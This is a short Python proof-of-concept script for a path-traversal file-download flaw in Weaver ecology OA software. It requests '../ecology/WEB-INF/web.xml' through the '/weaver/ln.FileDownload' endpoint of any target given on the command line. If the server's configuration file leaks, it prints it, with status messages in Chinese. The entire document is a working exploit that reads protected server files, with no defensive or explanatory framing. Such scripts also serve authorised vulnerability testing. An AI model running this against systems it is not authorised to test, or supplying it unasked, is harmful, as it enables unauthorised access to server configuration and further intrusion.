#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept-Encoding": "gzip"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if "<web-app>" in r.text:
        return r.text
    return ""
    

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取 web.xml 的结果为：", info)
    else:
        print("[-]漏洞不存在")
